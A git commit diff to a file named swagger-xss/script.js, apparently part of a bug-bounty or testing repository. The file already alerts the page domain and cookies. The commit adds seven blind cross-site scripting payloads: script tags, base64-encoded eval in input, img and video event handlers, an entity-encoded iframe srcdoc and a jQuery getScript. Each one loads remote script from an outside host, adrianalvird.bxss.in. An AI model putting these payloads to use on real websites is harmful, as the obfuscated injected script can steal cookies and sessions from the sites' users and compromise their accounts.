f75022eab09bdc4188caa1f8b22b1ea5b0402140
Subhadeep Pramanik <51330833+adrianalvird@users.noreply.github.com>
2024-12-04 19:57:32 +0530

    Update script.js

--- swagger-xss/script.js
+++ swagger-xss/script.js
@@ -1,1 +1,8 @@
 alert(document.domain + "\n" + document.cookie);
+javascript:eval('var a=document.createElement('script');a.src='https://adrianalvird.bxss.in';document.body.appendChild(a)')
+"><script src=https://adrianalvird.bxss.in></script>
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYWRyaWFuYWx2aXJkLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&#61;&#61; autofocus>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYWRyaWFuYWx2aXJkLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&#61;&#61 onerror=eval(atob(this.id))>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYWRyaWFuYWx2aXJkLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&#61;&#61;>
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;adrianalvird.bxss.in&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>$.getScript("//adrianalvird.bxss.in")</script>
